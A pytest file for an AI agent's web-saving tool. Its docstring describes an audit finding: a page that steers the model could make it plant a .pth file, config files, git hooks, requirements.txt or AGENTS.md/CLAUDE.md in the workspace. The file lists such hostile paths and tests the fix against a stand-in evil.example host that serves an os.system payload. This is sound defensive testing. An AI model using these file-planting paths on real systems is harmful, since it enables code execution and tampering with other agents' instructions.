"""A saved web extract is a note, never a file some program loads.

Security audit 2026-11-10, SEC-01. ``read_url_to_file`` runs with no approval
card (write tier) and saves what the fetched server answered -- a JSON answer
byte for byte, under header lines that all begin with ``# ``. Its only rules
were "inside the workspace" and "does not exist yet", so a page that steered
the model could plant ``.venv/Lib/site-packages/x.pth`` (Python runs its
``import`` lines at the next start) or ``kazma.local.yaml`` (settings: the
model gateway's address) on an install whose workspace is the install folder.

Now a save is a ``.md`` or ``.txt`` file with a plain name, outside every
environment, tool and dot folder, and never one of Kazma's own files.

2026-11 review: that still let a save be named like a file other programs
load (``requirements.txt``, ``CMakeLists.txt``, ``AGENTS.md``,
``CLAUDE.md``), and ``./name`` landed at the workspace root. Now a save lands
under the research folder only (``notes/x.md`` -> ``research/notes/x.md``)
and never under a name in ``read_url.LOADED_FILE_NAMES``.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import pytest

from kazma_core.tools import read_url as ru

HOSTILE = [
    ".venv/Lib/site-packages/zz_kazma.pth",
    ".venv/lib/python3.11/site-packages/zz.pth",
    "venv/Lib/site-packages/notes.md",          # a loaded folder, even as .md
    "VENV/Lib/Site-Packages/notes.md",          # Windows compares names without case
    "./kazma.local.yaml",
    "sub/kazma.yaml",
    "sub/conftest.py",
    "sub/sitecustomize.py",
    ".git/hooks/pre-commit",
    ".git/notes.md",
    ".github/workflows/x.md",
    ".kazma/observer.md",
    "kazma-data/notes.md",
    "node_modules/pkg/readme.md",
    "sub/.env",
    "sub/.hidden.md",
    "sub/run.bat",
    "sub/noext",
    "sub/kazma.local.yaml:notes.md",            # an alternate data stream on NTFS
]

#: Names other programs load, even as .md / .txt (2026-11 review).
LOADED = [
    "requirements.txt",
    "./requirements-dev.txt",
    "dev-requirements.txt",
    "constraints.txt",
    "sub/constraints-ci.txt",
    "CMakeLists.txt",
    "AGENTS.md",
    "./CLAUDE.md",
    "sub/GEMINI.md",
    "research/AGENTS.md",
    "research/reports/x/claude.md",
    "SKILL.md",
]

ALLOWED = [
    None,                                       # the default name under research/
    "sample.md",
    "notes/out.md",
    "./notes.md",
    "research/reports/topic-20261110/src-01.md",
    "research/thesis.txt",
    "Docs/Meeting Notes.MD",
    "requirements-notes.md",                    # a .md about requirements is a note
]


def _old_rule(root: Path, name: str) -> Path | str:
    """The rule as it was: inside the workspace is enough."""
    name = name.strip().replace("\\", "/").lstrip("/")
    if ".." in name.split("/"):
        return "Error: path traversal not allowed."
    target = (root / name).resolve()
    try:
        target.relative_to(root)
    except ValueError:
        return "Error: path must stay inside the active workspace."
    return target


@pytest.fixture()
def workspace(tmp_path: Path):
    root = (tmp_path / "ws").resolve()
    root.mkdir()
    with patch.object(ru, "_workspace_root", return_value=root):
        yield root


@pytest.mark.parametrize("path", HOSTILE)
def test_a_path_a_program_loads_is_refused(workspace: Path, path: str) -> None:
    answer = ru._safe_workspace_path(path, "https://example.com/p")
    assert isinstance(answer, str) and answer.startswith("Error:"), answer


@pytest.mark.parametrize("path", HOSTILE)
def test_control_the_old_rule_accepted_it(workspace: Path, path: str) -> None:
    assert isinstance(_old_rule(workspace, path), Path)


@pytest.mark.parametrize("path", ALLOWED)
def test_a_note_is_still_saved(workspace: Path, path: str | None) -> None:
    answer = ru._safe_workspace_path(path, "https://example.com/p")
    assert isinstance(answer, Path), answer
    # Under the research folder, whatever folder the path named.
    answer.relative_to(workspace / "research")


@pytest.mark.parametrize("path", LOADED)
def test_a_name_programs_load_is_refused(workspace: Path, path: str) -> None:
    answer = ru._safe_workspace_path(path, "https://example.com/p")
    assert isinstance(answer, str) and answer.startswith("Error:"), answer


def _rule_before_2026_11(root: Path, name: str) -> Path | str:
    """The 2026-11-10 rule: a slash path is workspace-relative, the suffix
    and dot/generated folders are checked, nothing about the name."""
    name = name.strip().replace("\\", "/").lstrip("/")
    target = (root / "research" / name) if "/" not in name else (root / name)
    target = target.resolve()
    relative = target.relative_to(root)
    if any(p.startswith(".") for p in relative.parts[:-1]):
        return "Error"
    if target.suffix.lower() not in (".md", ".txt"):
        return "Error"
    return target


@pytest.mark.parametrize("path", LOADED)
def test_control_the_2026_11_10_rule_accepted_it(workspace: Path, path: str) -> None:
    assert isinstance(_rule_before_2026_11(workspace, path), Path)


def test_control_dot_slash_landed_at_the_workspace_root(workspace: Path) -> None:
    """The old rule put ``./x.md`` beside the root's own files; now it is research/'s."""
    assert _rule_before_2026_11(workspace, "./x.md") == (workspace / "x.md").resolve()
    answer = ru._safe_workspace_path("./x.md", "https://example.com/p")
    assert answer == (workspace / "research" / "x.md").resolve()


#: Modules that create files with ``create_extract`` under names they make
#: themselves, never a name a tool call gave, with why.
_OWN_NAMES = {
    "kazma-core/kazma_core/tools/research_pipeline.py": (
        "the deep research run's own files (src-NN.md go through save_url_extract; "
        "digests and the report under research/reports/<run>/, _workspace_research_dir)"
    ),
    "kazma-core/kazma_core/web_acquire/research_pipeline_job.py": (
        "the pipeline journal publishes the files the pipeline named"
    ),
}


def test_every_extract_writer_names_its_file_through_the_one_rule() -> None:
    """Class gate: product code creates an extract (``create_extract``) only
    with a target ``_safe_workspace_path`` gave it, in the same function, or
    under a name it makes itself (declared in ``_OWN_NAMES``)."""
    import ast
    import subprocess

    repo = Path(__file__).resolve().parents[1]
    listed = subprocess.run(
        ["git", "ls-files", "-z", "--", "kazma-core", "kazma-skills"],
        cwd=repo, capture_output=True, check=True,
    ).stdout.decode("utf-8").split("\0")
    offenders: list[str] = []
    declared: set[str] = set()
    writers = 0
    for rel in listed:
        if not rel.endswith(".py") or "/tests/" in rel:
            continue
        tree = ast.parse((repo / rel).read_text(encoding="utf-8"))
        for fn in ast.walk(tree):
            if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            names = {
                (n.func.id if isinstance(n.func, ast.Name) else getattr(n.func, "attr", ""))
                for n in ast.walk(fn) if isinstance(n, ast.Call)
            }
            names |= {n.id for n in ast.walk(fn) if isinstance(n, ast.Name)}
            if "create_extract" in names and fn.name != "create_extract":
                writers += 1
                if rel in _OWN_NAMES:
                    declared.add(rel)
                elif "_safe_workspace_path" not in names:
                    offenders.append(f"{rel}:{fn.name}")
    assert writers >= 2, "the gate found no extract writer; is it still reading the source?"
    assert not offenders, f"these write an extract without _safe_workspace_path: {offenders}"
    assert declared == set(_OWN_NAMES), f"stale declarations: {set(_OWN_NAMES) - declared}"


def test_the_gate_sees_a_writer_that_skips_the_rule() -> None:
    """Negative control for the gate's reading: a function that writes an
    extract to a path it was handed, with no _safe_workspace_path."""
    import ast

    planted = (
        "async def save(path, text):\n"
        "    from kazma_core.tools.research_files import create_extract\n"
        "    await call(create_extract, Path(path), text)\n"
    )
    fn = ast.parse(planted).body[0]
    names = {
        (n.func.id if isinstance(n.func, ast.Name) else getattr(n.func, "attr", ""))
        for n in ast.walk(fn) if isinstance(n, ast.Call)
    } | {n.id for n in ast.walk(fn) if isinstance(n, ast.Name)}
    assert "create_extract" in names and "_safe_workspace_path" not in names


@pytest.mark.asyncio
async def test_the_tool_plants_nothing(workspace: Path) -> None:
    """End to end: the tool's answer is an error and no file appears."""
    from kazma_core.web_acquire import FetchResult

    ru.clear_url_cache()

    async def fake_fetch(url: str, **kwargs) -> FetchResult:
        return FetchResult(ok=True, url=url, text='import os;os.system("calc")')

    target = ".venv/Lib/site-packages/zz_kazma.pth"
    with patch.object(ru, "fetch_result", side_effect=fake_fetch):
        answer = await ru.read_url_to_file("https://evil.example/p", path=target)
        assert answer.startswith("Error:"), answer
        assert not (workspace / target).exists()
        assert not (workspace / ".venv").exists()

        saved = await ru.read_url_to_file("https://evil.example/p", path="notes/page.md")
        assert "Saved" in saved
        assert (workspace / "research" / "notes" / "page.md").is_file()

        for name in ("./requirements.txt", "AGENTS.md"):
            refused = await ru.read_url_to_file("https://evil.example/p", path=name)
            assert refused.startswith("Error:"), refused
        assert not (workspace / "requirements.txt").exists()
        assert not (workspace / "research" / "AGENTS.md").exists()


def test_the_crawler_saves_through_the_same_rule() -> None:
    """``crawl_site`` (read tier) names its files through this helper too."""
    from kazma_core.tools import web_research

    assert web_research._safe_workspace_path is ru._safe_workspace_path
